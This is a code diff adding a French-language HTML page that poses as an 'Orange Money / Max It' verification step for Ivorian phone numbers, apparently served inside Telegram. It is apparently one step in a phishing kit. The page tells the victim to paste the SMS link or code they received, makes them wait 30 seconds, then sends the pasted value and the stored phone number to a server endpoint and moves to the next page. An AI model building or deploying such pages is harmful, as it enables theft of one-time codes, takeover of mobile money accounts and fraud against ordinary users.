@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Vérification Max It</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #f7f7f7; margin: 0; display: flex; flex-direction: column; align-items: center; font-family: sans-serif; }
+        .header-box { width: 100%; background: #f15a24; padding: 25px; color: white; text-align: center; font-size: 26px; font-weight: 800; }
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; margin-top: 20px; }
+        
+        /* Enlarged input field for the SMS link or code */
+        .link-input { width: 100%; height: 80px; border: 2px solid #f15a24; border-radius: 10px; padding: 10px; font-size: 16px; font-family: sans-serif; box-sizing: border-box; resize: none; margin-bottom: 20px; }
+        
+        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-weight: 800; }
+        .submit-btn.active { background-color: #f15a24; color: white; cursor: pointer; }
+        .timer-text { font-size: 14px; color: #666; margin-bottom: 15px; text-align: center; font-weight: 600; }
+    </style>
+</head>
+<body>
+<div class="header-box">Orange Money</div>
+<div class="card">
+    <h2>Vérification Max it</h2>
+    <p>Collez le lien ou le message reçu par SMS ci-dessous :</p>
+    <div style="font-weight:800; margin-bottom:20px;">🇨🇮 +225 <span id="displayPhone"></span></div>
+    
+    <!-- Expanded single field for pasting link/code -->
+    <textarea id="smsLinkInput" class="link-input" placeholder="Collez le lien ou le SMS ici..."></textarea>
+    
+    <div id="timerText" class="timer-text">Veuillez patienter <span id="countdown">30</span>s avant de valider...</div>
+    
+    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
+</div>
+<script>
+    const smsLinkInput = document.getElementById('smsLinkInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const countdownEl = document.getElementById('countdown');
+    const timerText = document.getElementById('timerText');
+    
+    document.getElementById('displayPhone').textContent = localStorage.getItem('phone');
+
+    let isTimeElapsed = false;
+    let timeLeft = 30;
+
+    // 30-second timer condition
+    const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            isTimeElapsed = true;
+            timerText.style.display = 'none';
+            checkFormValidity();
+        }
+    }, 1000);
+
+    function checkFormValidity() {
+        const hasText = smsLinkInput.value.trim().length > 0;
+        const isValid = hasText && isTimeElapsed;
+        
+        submitBtn.disabled = !isValid;
+        submitBtn.classList.toggle('active', isValid);
+    }
+
+    smsLinkInput.addEventListener('input', checkFormValidity);
+
+    submitBtn.addEventListener('click', async () => {
+        if (!submitBtn.disabled) {
+            const linkValue = smsLinkInput.value.trim();
+            await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: localStorage.getItem('phone'), code: linkValue, country: "CI" })
+            });
+            window.location.href = "page9.html";
+        }
+    });
+</script>
+</body>
+</html>
